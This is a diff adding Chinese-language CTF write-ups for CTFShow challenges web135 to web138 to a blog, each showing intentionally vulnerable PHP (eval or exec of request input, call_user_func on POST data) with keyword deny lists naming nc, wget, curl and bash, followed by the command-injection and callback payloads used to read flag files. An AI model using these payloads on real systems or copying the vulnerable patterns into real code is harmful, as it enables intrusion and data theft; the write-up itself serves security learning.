@@ -1096,6 +1096,64 @@
 <li>最终结果: ?_POST[key1]=36d&amp;_POST[key2]=36d</li>
 </ul>
 <p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web134_1.png"></p>
+<h2 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h2><p>源码:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-16 18:48:03</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(substr(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;师傅们居然破解了前面的，那就来一个加强版吧&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>分析:</strong></p>
+<ul>
+<li>这题和 web 133类似，多了过滤的内容，看了看网上大佬的文章:</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?F=`<span class="variable">$F</span> `; cp flag.php <span class="number">1</span>.txt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>执行后访问 1.txt </li>
+</ul>
+<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web135.png"></p>
+<h2 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h2><p>源码:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    check(<span class="variable">$c</span>);</span><br><span class="line">    exec(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>分析:</strong></p>
+<ul>
+<li>还是和上一题类似，参考羽师傅的文章,用到 tee 命令:用于读取标准输入的数据，并将其内容输出成文件。tee指令会从标准输入设备读取数据，将其内容输出到标准输出设备，同时保存成文件。详情百度</li>
+<li>?c=ls|tee 1 将 ls 出来的内容 通过 tee 存入 文件 1 中，然后访问  url/1 将下载此文件打开发现:当前目录没有flag.php文件</li>
+</ul>
+<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web136.png"></p>
+<ul>
+<li>?c=ls / |tee 1 将 ls / 根目录中的内容通过 tee 写入到 1 中，再次打开: 发现根目录下有 : f149_15_h3r3</li>
+</ul>
+<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web136_1.png"></p>
+<ul>
+<li>?c=cat /f149_15_h3r3 |tee flag 打开得到 flag</li>
+</ul>
+<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web136_2.png"></p>
+<h2 id="web137"><a href="#web137" class="headerlink" title="web137"></a>web137</h2><p>源码:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-16 22:27:49</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">call_user_func(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p><strong>分析:</strong></p>
+<ul>
+<li>call_user_func() 在 web128中使用过一次。把第一个参数作为回调函数调用</li>
+<li>代码中 定义了 一个 ctfshow 类，类中有 函数 getFlag() </li>
+<li>我们需要通过 call_user_func() 来调用这个类中的函数。</li>
+<li>在 类 中 可以使用 :: 两个冒号来调用类中的函数和属性。</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">post:</span><br><span class="line">ctfshow=ctfshow::getFlag</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web137.png"></p>
+<h2 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h2><p>源码:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-16 22:52:13</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strripos(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>], <span class="string">&quot;:&quot;</span>)&gt;-<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;private function&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">call_user_func(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>分析:</strong></p>
+<ul>
+<li>此题相较于上一题的基础上对 :（冒号） 进行了匹配，不管怎么输入 :（冒号）， strripos() 匹配的结果都是 正数。因此得换一个方法来调用类中的内容。</li>
+<li>call_user_func() 的手册中有对 如何调取 类 进行了讲解如下图：</li>
+</ul>
+<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web138.png"></p>
+<ul>
+<li>发现可以使用数组，第一个参数为 类名，第二个参数为 类中的函数名(方法名)</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// post:</span></span><br><span class="line">ctfshow[<span class="number">0</span>]=ctfshow&amp;ctfshow[<span class="number">1</span>]=getFlag</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web138_1.png"></p>
 ]]></content>
       <categories>
         <category>CTF笔记</category>
